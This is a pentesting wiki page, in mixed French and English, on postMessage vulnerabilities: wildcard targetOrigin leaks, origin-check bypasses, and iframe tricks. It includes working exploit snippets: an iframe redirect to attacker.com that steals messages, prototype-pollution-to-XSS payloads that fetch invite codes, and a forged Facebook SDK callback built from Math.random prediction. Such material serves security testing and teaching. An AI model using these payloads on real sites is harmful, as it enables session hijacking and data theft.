# PostMessage Vulnérabilités

{{#include ../../banners/hacktricks-training.md}}

## Envoyer **PostMessage**

**PostMessage** utilise la fonction suivante pour envoyer un message :
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Notez que **targetOrigin** peut être un '\*' ou une URL comme _https://company.com._\
Dans le **deuxième scénario**, le **message ne peut être envoyé que vers ce domaine** (même si l'origine du **Window object** est différente).\
Si le **wildcard** est utilisé, **les messages pourraient être envoyés à n'importe quel domaine**, et seront envoyés à l'origine du **Window object**.

### Attaquer iframe & wildcard dans **targetOrigin**

Comme expliqué dans [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si vous trouvez une page qui peut être **iframed** (pas de protection `X-Frame-Header`) et qui **envoie des messages sensibles** via **postMessage** en utilisant un **wildcard** (\*), vous pouvez **modifier** le **origin** de l'**iframe** et **leak** le message **sensible** vers un domaine contrôlé par vous.\  
Notez que si la page peut être iframed mais que le **targetOrigin** est **défini sur une URL et non sur un wildcard**, cette **astuce ne fonctionnera pas**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Exploitation de addEventListener

**`addEventListener`** est la fonction utilisée par JS pour déclarer la fonction qui **attend des `postMessages`**.\
Un code similaire au suivant sera utilisé :
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Rechercher** dans le code JS `window.addEventListener` et `$(window).on` (_version JQuery_)
- **Exécuter** dans la console des devtools : `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Aller dans** _Elements --> Event Listeners_ dans les devtools du navigateur

![](<../../images/image (396).png>)

- Utiliser une **extension de navigateur** comme [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ces extensions **intercepteront tous les messages** et vous les afficheront.

### Origin check bypasses

- L'attribut **`event.isTrusted`** est considéré comme sécurisé car il renvoie `True` uniquement pour les événements générés par de véritables actions utilisateur. Bien qu'il soit difficile à contourner s'il est correctement implémenté, son importance dans les vérifications de sécurité est notable.
- L'utilisation de **`indexOf()`** pour la validation de l'origine dans les événements PostMessage peut être sujette à contournement. Un exemple illustrant cette vulnérabilité est :

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- La méthode **`search()`** de `String.prototype.search()` est destinée aux expressions régulières, pas aux chaînes. Passer autre chose qu'un regexp entraîne une conversion implicite en regex, rendant la méthode potentiellement non sécurisée. En regex, un point (.) sert de wildcard, permettant de contourner la validation avec des domaines spécialement conçus. Par exemple :

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La fonction **`match()`**, semblable à `search()`, traite les regex. Si la regex est mal construite, elle peut être sujette à contournement.
- La fonction **`escapeHtml`** est censée assainir les entrées en échappant les caractères. Cependant, elle ne crée pas un nouvel objet échappé mais écrase les propriétés de l'objet existant. Ce comportement peut être exploité. Plus particulièrement, si un objet peut être manipulé de sorte que sa propriété contrôlée ne reconnaisse pas `hasOwnProperty`, `escapeHtml` ne fonctionnera pas comme prévu. Ceci est démontré par les exemples ci-dessous :

- Échec attendu :

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Contournement de l'échappement :

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Dans le contexte de cette vulnérabilité, l'objet `File` est particulièrement exploitable en raison de sa propriété en lecture seule `name`. Cette propriété, lorsque utilisée dans des templates, n'est pas assainie par `escapeHtml`, ce qui entraîne des risques de sécurité potentiels.

- La propriété `document.domain` en JavaScript peut être définie par un script pour raccourcir le domaine, permettant une application plus laxiste de la same-origin policy au sein du même domaine parent.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, it's crucial to understand that the iframe's origin will be set to null. This is particularly important when dealing with **sandbox attributes** and their implications on security and functionality.

By specifying **`allow-popups`** in the sandbox attribute, any popup window opened from within the iframe inherits the sandbox restrictions of its parent. This means that unless the **`allow-popups-to-escape-sandbox`** attribute is also included, the popup window's origin is similarly set to `null`, aligning with the iframe's origin.

Consequently, when a popup is opened under these conditions and a message is sent from the iframe to the popup using **`postMessage`**, both the sending and receiving ends have their origins set to `null`. This situation leads to a scenario where **`e.origin == window.origin`** evaluates to true (`null == null`), because both the iframe and the popup share the same origin value of `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Il est possible de vérifier si le message provient de la même fenêtre dans laquelle le script écoute (particulièrement intéressant pour les **Content Scripts from browser extensions** afin de vérifier si le message a été envoyé depuis la même page) :
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Vous pouvez forcer **`e.source`** d'un message à être null en créant un **iframe** qui **envoie** le **postMessage** et est **immédiatement supprimé**.

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Pour réaliser ces attaques, idéalement vous pourrez **mettre la victim web page** à l'intérieur d'un `iframe`. Mais certains headers comme `X-Frame-Header` peuvent **empêcher** ce **comportement**.\
Dans ces scénarios vous pouvez toujours utiliser une attaque moins furtive. Vous pouvez ouvrir un nouvel onglet vers l'application web vulnérable et communiquer avec elle:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Stealing message sent to child by blocking the main page

Dans la page suivante vous pouvez voir comment vous pourriez voler des **données postmessage sensibles** envoyées à un **iframe enfant** en **bloquant** la **page principale** avant l'envoi des données et en abusant d'une **XSS dans l'enfant** pour **leak les données** avant qu'elles ne soient reçues :


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Stealing message by modifying iframe location

Si vous pouvez iframe une page web sans X-Frame-Header qui contient un autre iframe, vous pouvez **changer la location** de cet iframe enfant, donc s'il reçoit un **postmessage** envoyé en utilisant un **wildcard**, un attaquant pourrait **changer** l'**origin** de cet iframe vers une page **contrôlée** par lui et **voler** le message :


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

Dans des scénarios où les données envoyées via `postMessage` sont exécutées par du JS, vous pouvez iframe la page et exploiter la **Prototype Pollution/XSS** en envoyant l'exploit via `postMessage`.

A couple of **very good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Exemple d'un exploit pour abuser de **Prototype Pollution** puis **XSS** via un `postMessage` vers un `iframe` :
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Pour **plus d'informations** :

- Lien vers la page sur [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Lien vers la page sur [**XSS**](../xss-cross-site-scripting/index.html)
- Lien vers la page sur [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Prédiction des tokens de callback de **`Math.random()`** dans les ponts postMessage

Quand la validation des messages utilise un « secret partagé » généré avec `Math.random()` (par ex., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) et que le même helper nomme aussi les iframes de plugin, vous pouvez récupérer PRNG outputs et forger des messages de confiance :

- **Leak PRNG outputs via `window.name`:** Le SDK nomme automatiquement les iframes de plugin avec `guid()`. Si vous contrôlez le top frame, encapsulez la page victime dans un iframe, puis naviguez l'iframe du plugin vers votre origine (par ex., `window.frames[0].frames[0].location='https://attacker.com'`) et lisez `window.frames[0].frames[0].name` pour obtenir une sortie brute de `Math.random()`.
- **Force more outputs without reloads:** Certains SDK exposent un chemin de reinit ; dans le FB SDK, déclencher `init:post` avec `{xfbml:1}` force `XFBML.parse()`, détruit/recrée l'iframe du plugin et génère de nouveaux noms/IDs de callback. Une réinit répétée produit autant de PRNG outputs que nécessaire (attention aux appels internes supplémentaires à `Math.random()` pour les IDs de callback/iframe, les solveurs doivent donc sauter les valeurs intermédiaires).
- **Trusted-origin delivery via parameter pollution:** Si un endpoint de plugin first-party reflète un paramètre non désinfecté dans la payload cross-window (par ex., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), vous pouvez injecter `&type=...&iconSVG=...` tout en préservant l'origine de confiance `facebook.com`.
- **Predict the next callback:** Convertissez les leaked iframe names en floats dans `[0,1)` et fournissez plusieurs valeurs (même non consécutives) à un prédicteur V8 `Math.random` (par ex., basé sur Z3). Générez le prochain `guid()` localement pour forger le token de callback attendu.
- **Trigger the sink:** Façonnez les données postMessage pour que le bridge déclenche `xd.mpn.setupIconIframe` et injecte du HTML dans `iconSVG` (par ex., encodé en URL `<img src=x onerror=...>`), aboutissant à un DOM XSS à l'intérieur de l'origine hébergeuse ; à partir de là, les iframes same-origin (OAuth dialogs, arbiters, etc.) peuvent être lus.
- **Framing quirks help:** La chaîne requiert du framing. Dans certains webviews mobiles, `X-Frame-Options` peut se dégrader en un `ALLOW-FROM` non supporté lorsque `frame-ancestors` est présent, et des paramètres “compat” peuvent forcer des `frame-ancestors` permissifs, activant le canal latéral `window.name`.

#### Exemple minimal de message forgé
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Références

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Pour s'exercer : [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
